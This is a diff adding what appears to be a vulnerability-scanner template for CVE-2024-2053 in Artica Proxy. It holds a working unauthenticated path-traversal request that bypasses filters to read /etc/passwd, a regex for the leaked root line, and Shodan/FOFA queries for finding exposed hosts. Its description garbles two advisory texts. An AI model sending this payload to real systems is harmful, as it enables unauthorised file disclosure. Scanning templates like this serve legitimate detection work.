@@ -1,0 +1,51 @@
+id: CVE-2024-2053
+
+info:
+  name: "Artica Proxy 未授权本地文件包含漏洞"
+  author: pussycat0x
+  severity: high
+  description: |
+    The Artica Proxy administrative web application will deserialize arbitrary PHP objects supplied by unauthenticated users and subsequently enable code execution as the "www-data" user. This issue was demonstrated on version 4.50 of the The Artica-Proxy administrative web application attempts to prevent local file inclusion. These protections can be bypassed and arbitrary file requests supplied by unauthenticated users will be returned according to the privileges of the "www-data" user.
+  reference:
+    - https://github.com/0xMarcio/cve/blob/main/2024/CVE-2024-2053.md#cve-2024-2053
+    - https://seclists.org/fulldisclosure/2024/Mar/11
+    - https://korelogic.com/Resources/Advisories/KL-001-2024-001.txt
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cve-id: CVE-2024-2053
+    cwe-id: CWE-23
+    epss-score: 0.55165
+    epss-percentile: 0.97966
+    cpe: cpe:2.3:a:articatech:artica_proxy:4.40:*:*:*:*:*:*:*
+  metadata:
+    vendor: articatech
+    product: artica_proxy
+    shodan-query: http.html:"artica"
+    fofa-query: body="artica"
+    verified: true
+    max-request: 1
+  tags: artica-proxy
+
+http:
+  - raw:
+      - |
+        GET /images.listener.php?uri=1&mailattach=..././..././..././..././..././epasswdtc/ppasswdasswd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: word
+        part: body
+        words:
+          - "application/force-download"
+
+      - type: status
+        status:
+          - 200
+# digest: 490a004630440220371a3a28e79993c4a327e74a4b99f8a868fb7f4d1b2c1b79b5c4b1a302e44203022058d7b0521beb249ef3eba49b94477d05ffd222221c13f87e9fab833d84c2499c:922c64590222798bb761d5b6d8e72950
